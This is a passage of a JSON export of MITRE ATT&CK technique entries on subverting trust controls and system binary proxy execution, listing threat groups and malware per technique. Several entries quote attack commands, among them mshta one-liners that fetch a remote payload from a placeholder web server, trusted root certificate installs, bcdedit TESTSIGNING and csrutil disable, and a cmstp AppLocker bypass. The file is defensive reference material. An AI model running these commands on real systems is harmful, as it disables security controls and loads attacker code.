                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> has been signed by valid certificates assigned to Hermetica Digital.[43]"
                    },
                    "S0163": {
                        "ID": "S0163",
                        "Name": "Janicab",
                        "Description": "<name> used a valid AppleDeveloperID to sign the code to get past security restrictions.[44]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has signed files with the name EGIS CO,. Ltd..[45]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has digitally signed malware and utilities to evade detection.[46]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used stolen code signing certificates to sign malware.[47][48]"
                    },
                    "S0372": {
                        "ID": "S0372",
                        "Name": "LockerGoga",
                        "Description": "<name> has been signed with stolen certificates in order to make it look more legitimate.[49]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has signed their malware with a valid digital signature.[50]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures.[28]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has digitally signed executables using AVAST Software certificates.[51]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> has used forged Microsoft code-signing certificates on malware.[52]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name> has used a signed binary shellcode loader and a signed Dynamic Link Library (DLL) to create a reverse shell.[31]"
                    },
                    "G1009": {
                        "ID": "G1009",
                        "Name": "Moses Staff",
                        "Description": "<name> has used signed drivers from an open source tool called DiskCryptor to evade detection.[53]"
                    },
                    "S0210": {
                        "ID": "S0210",
                        "Name": "Nerex",
                        "Description": "<name> drops a signed Microsoft DLL to disk.[54]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group digitally signed their own malware to evade detection.[55]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, the threat actors deployed the MaoCheng dropper with a stolen Adobe Systems digital signature.[56]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.[9]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name>, its installer, and tools are signed with stolen code-signing certificates.[57]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has signed code with self-signed certificates.[58]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use signed loaders to evade detection.[59][60]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "A <name> .dll file is digitally signed by a certificate from AirVPN.[61]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> samples have been signed with a code-signing certificates.[62]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "<name> has used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC.[63]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used a valid certificate to sign their primary loader <name>.Downloader (aka TrueBot).[64]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.[65]"
                    },
                    "S0646": {
                        "ID": "S0646",
                        "Name": "SpicyOmelette",
                        "Description": "<name> has been signed with valid digital certificates.[66]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> has been signed with self-signed certificates.[58]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> used a digitally signed driver with a compromised Realtek certificate.[67]"
                    },
                    "G0039": {
                        "ID": "G0039",
                        "Name": "Suckfly",
                        "Description": "<name> has used stolen certificates to sign its malware.[68]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> was digitally signed by SolarWinds from March - May 2020.[65]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> has been signed with stolen digital certificates.[69]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has signed payloads with code signing certificates from Thawte and Sectigo.[70][71][72]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has come with a signed downloader component.[5]"
                    },
                    "G0044": {
                        "ID": "G0044",
                        "Name": "Winnti Group",
                        "Description": "<name> used stolen certificates to sign its malware.[73]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used Digicert code-signing certificates for some of its malware.[74]"
                    }
                }
            },
            "003": {
                "name": "SIP and Trust Provider Hijacking",
                "href": "/techniques/T1553/003",
                "description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode [1] digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  [2] which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. [3]Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) [4] to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  [5]) and are identified by globally unique identifiers (GUIDs). [3]Similar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: [3]Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP [6] (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID} that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP [6] (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.Modifying the DLL and Function Registry values in HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{trust provider GUID} that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).Note: The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. [3]",
                "Procedure": {}
            },
            "004": {
                "name": "Install Root Certificate",
                "href": "/techniques/T1553/004",
                "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.[1] Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.[2]Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications.[3]Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.[4]In macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain.[5]",
                "Procedure": {
                    "S0160": {
                        "ID": "S0160",
                        "Name": "certutil",
                        "Description": "<name> can be used to install browser root certificates as a precursor to performing Adversary-in-the-Middle between connections to banking websites. Example command: <name> -addstore -f -user ROOT ProgramData\\cert512121.der.[6]"
                    },
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> installs a root certificate to aid in Adversary-in-the-Middle actions using the command add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename.[7][8]"
                    },
                    "S0009": {
                        "ID": "S0009",
                        "Name": "Hikit",
                        "Description": "<name> installs a self-generated certificate to the local trust store as a root CA and Trusted Publisher.[9]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> can add a certificate to the Windows store.[10][11]"
                    }
                }
            },
            "005": {
                "name": "Mark-of-the-Web Bypass",
                "href": "/techniques/T1553/005",
                "description": "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named Zone.Identifier with a specific value known as the MOTW.[1] Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.[2][3][4]Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.[2][3]",
                "Procedure": {
                    "S1025": {
                        "ID": "S1025",
                        "Name": "Amadey",
                        "Description": "<name> has modified the :Zone.Identifier in the ADS area to zero.[5]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has embedded ISO images and VHDX files in HTML to evade Mark-of-the-Web.[6]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has been packaged in ISO files in order to bypass Mark of the Web (MOTW) security measures.[7]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used .iso files to deploy malicious .lnk files.[8]"
                    }
                }
            },
            "006": {
                "name": "Code Signing Policy Modification",
                "href": "/techniques/T1553/006",
                "description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.[1][2] Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.[3][2]Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.[4][2][5][6] Examples of commands that can modify the code signing policy of a system include bcdedit.exe -set TESTSIGNING ON on Windows and csrutil disable on macOS.[4][2] Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.[7]To gain access to kernel memory to modify variables related to signature checks, such as modifying g_CiOptions to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.[8][6]",
                "Procedure": {
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used malware to turn off the RequireSigned feature which ensures only signed DLLs can be run on Windows.[9]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "<name> has enabled the TESTSIGNING boot configuration option to facilitate loading of a driver component.[7]"
                    },
                    "S0009": {
                        "ID": "S0009",
                        "Name": "Hikit",
                        "Description": "<name> has attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component.[5]"
                    },
                    "S0664": {
                        "ID": "S0664",
                        "Name": "Pandora",
                        "Description": "<name> can use CVE-2017-15303 to disable Windows Driver Signature Enforcement (DSE) protection and load its driver.[10]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges.[8][6]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls.[1] Adversaries may also create or steal code signing certificates to acquire trust on target systems.[2][3]",
        "Procedure": {
            "G0001": {
                "ID": "G0001",
                "Name": "Axiom",
                "Description": "malware has used digital certificates to deliver malware.[4]"
            }
        }
    },
    "T1218": {
        "ttp_name": "System Binary Proxy Execution",
        "ttp_id": "T1218",
        "href": "/techniques/T1218",
        "subtechnique": {
            "001": {
                "name": "Compiled HTML File",
                "href": "/techniques/T1218/001",
                "description": "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. [1] CHM content is displayed using underlying components of the Internet Explorer browser [2] loaded by the HTML Help executable program (hh.exe). [3]A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. [4] [5]",
                "Procedure": {
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used CHM files to move concealed payloads.[6]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used compiled HTML (.chm) files for targeting.[7]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> uses ActiveX objects for file execution and manipulation. [8]"
                    },
                    "G0070": {
                        "ID": "G0070",
                        "Name": "Dark Caracal",
                        "Description": "<name> leveraged a compiled HTML file that contained a command to download and run an executable.[9]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used a CHM payload to load and execute another malicious file once delivered to a victim.[10]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has weaponized CHM files in their phishing campaigns.[11][12][13][14]"
                    }
                }
            },
            "002": {
                "name": "Control Panel",
                "href": "/techniques/T1218/002",
                "description": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function.[1][2] For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.[1] Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.[1] [2][3]Malicious Control Panel items can be delivered via Phishing campaigns[2][3] or executed as part of multi-stage malware.[4] Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls. Even when these registered DLLs do not comply with the CPL file specification and do not export CPlApplet functions, they are loaded and executed through its DllEntryPoint when Control Panel is executed. CPL files not exporting CPlApplet are not directly executable.[5]",
                "Procedure": {
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has used control panel files (CPL), delivered via e-mail, for execution.[6]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can register itself for execution and persistence via the Control Panel.[5]"
                    },
                    "S0172": {
                        "ID": "S0172",
                        "Name": "Reaver",
                        "Description": "<name> drops and executes a malicious CPL file as its payload.[4]"
                    }
                }
            },
            "003": {
                "name": "CMSTP",
                "href": "/techniques/T1218/003",
                "description": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. [1] CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.Adversaries may supply CMSTP.exe with INF files infected with malicious commands. [2] Similar to Regsvr32 / \"Squiblydoo\", CMSTP.exe may be abused to load and execute DLLs [3]  and/or COM scriptlets (SCT) from remote servers. [4] [5] [6] This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. [3] [5] [6]",
                "Procedure": {
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used the command cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.[7][8][9]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload.[10]"
                    }
                }
            },
            "004": {
                "name": "InstallUtil",
                "href": "/techniques/T1218/004",
                "description": "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. [1] The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exe and C:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe.InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)]. [2]",
                "Procedure": {
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used Installutill to download content.[3]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used InstallUtil.exe to execute malicious software.[4]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used InstallUtil.exe to execute a malicious Beacon stager.[5]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> had used InstallUtil.exe to download and deploy executables.[6]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> has used InstallUtil.exe as part of its process to disable Windows Defender.[7]"
                    }
                }
            },
            "005": {
                "name": "Mshta",
                "href": "/techniques/T1218/005",
                "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code [1] [2] [3] [4] [5] Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. [6] HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. [7]Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. [8]",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has use mshta to execute malicious scripts on a compromised host.[9]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used mshta.exe for code execution.[10][11]"
                    },
                    "S0414": {
                        "ID": "S0414",
                        "Name": "BabyShark",
                        "Description": "<name> has used mshta.exe to download and execute applications from a remote server.[12]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors used mshta to execute DLLs.[13]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has used mshta.exe to execute malicious VBScript.[14]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has used mshta.exe to load an HTA script within a malicious .LNK file.[15]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used mshta.exe to execute VBScript to execute malicious code on victim systems.[5]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has used mshta.exe to execute malicious HTA files.[16]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has used malicious HTA files to drop and execute malware.[17]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used mshta.exe to run malicious scripts on the system.[18][12][19][20]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can use mshta to serve additional payloads and to help schedule tasks for persistence.[21][22]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used mshta.exe to execute HTML pages downloaded by initial access documents.[23][24]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used mshta.exe to execute Koadic stagers.[22]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has used mshta.exe to execute a HTA payload.[25]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.[26][27]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used mshta.exe to launch collection scripts.[28]"
                    },
                    "S0228": {
                        "ID": "S0228",
                        "Name": "NanHaiShu",
                        "Description": "<name> uses mshta.exe to load its program and files.[29]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "During <name>, the threat actors executed JavaScript code via mshta.exe.[1]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> can use Mshta.exe to execute additional payloads on compromised hosts.[26]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> can use mshta.exe to execute an HTA file hosted on a remote server.[16]"
                    },
                    "S0379": {
                        "ID": "S0379",
                        "Name": "Revenge RAT",
                        "Description": "<name> uses mshta.exe to run malicious scripts on the system.[30]"
                    },
                    "S0589": {
                        "ID": "S0589",
                        "Name": "Sibot",
                        "Description": "<name> has been executed via MSHTA application.[31]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> has utilized mshta.exe to execute a malicious hta file.[32]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used mshta.exe to execute malicious payloads.[33][34]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used mshta to execute scripts including VBS.[35]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has used mshta.exe to execute malicious payloads.[36]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> can use mshta for executing scripts.[37]"
                    }
                }
            },
            "007": {
                "name": "Msiexec",
                "href": "/techniques/T1218/007",
                "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).[1] The Msiexec.exe binary may also be digitally signed by Microsoft.Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.[2][3] Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the AlwaysInstallElevated policy is enabled.[4]",
                "Procedure": {
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has been installed via MSI installer.[5]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used .MSI files as an initial way to start the infection chain.[6]"
                    },
                    "S0611": {
                        "ID": "S0611",
                        "Name": "Clop",
                        "Description": "<name> can use msiexec.exe to disable security tools on the system.[7]"
                    },
                    "S1052": {
                        "ID": "S1052",
                        "Name": "DEADEYE",
                        "Description": "<name> can use msiexec.exe for execution of malicious DLL.[8]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "<name> has used msiexec to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.[9]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> has been installed via msiexec.exe.[10]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can use MSI files to execute DLLs.[11]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application. [12]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> has used the MSI installer to download and execute malicious payloads.[11]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> used an MSI installer to install the virtualization software.[13]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name> has used msiexec to install the <name> malware.[14]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using msiexec.[15]"
                    },
                    "S0530": {
                        "ID": "S0530",
                        "Name": "Melcoz",
                        "Description": "<name> can use MSI files with embedded VBScript for execution.[11]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has used MsiExec.exe to automatically execute files.[16][17]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> has been installed via MSI installer.[18][19]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> has used msiexec.exe to execute an MSI payload.[20]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use MSIExec to spawn multiple cmd.exe processes.[21]"
                    },
                    "S0481": {
                        "ID": "S0481",
                        "Name": "Ragnar Locker",
                        "Description": "<name> has been delivered as an unsigned MSI package that was executed with msiexec.exe.[22]"
                    },
                    "G0075": {
                        "ID": "G0075",
                        "Name": "Rancor",
                        "Description": "<name> has used msiexec to download and execute malicious installer files over HTTP.[23]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> has the ability to execute inside the msiexec.exe process.[24]"
                    },
                    "S0592": {
                        "ID": "S0592",
                        "Name": "RemoteUtilities",
                        "Description": "<name> can use Msiexec to install a service.[25]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used msiexec to download and execute malicious Windows Installer files.[26][27][28]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used the msiexec.exe command-line utility to download and execute malicious MSI files.[29]"
                    }
                }
            },
            "008": {
                "name": "Odbcconf",
                "href": "/techniques/T1218/008",
